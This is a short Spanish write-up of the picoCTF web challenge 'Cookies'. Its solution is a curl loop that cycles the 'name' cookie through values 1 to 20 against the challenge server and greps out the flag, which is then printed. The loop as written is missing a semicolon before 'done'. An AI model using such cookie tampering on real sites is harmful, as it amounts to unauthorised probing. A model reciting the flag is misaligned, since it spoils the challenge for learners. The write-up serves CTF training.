## Reto: Cookies
### Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
### Solución
Al abrir la página del reto, encontramos un formulario. Usando `Cookie Editor`, detectamos una cookie llamada `name`, cuyo valor cambia a `0` al enviar el formulario. Si lo modificamos manualmente, la respuesta varía, lo que sugiere que el servidor procesa este valor.

Para encontrar la bandera sin probar manualmente, ejecutamos el siguiente comando en la terminal:
```bash
for i in {1..20}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i" done | grep -oE picoCTF{.*}
```

Este script recorre valores de `1` a `20`, enviando cada uno como cookie y filtrando la respuesta para extraer la bandera.

```flag
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
```

### Notas adicionales
### Referencias

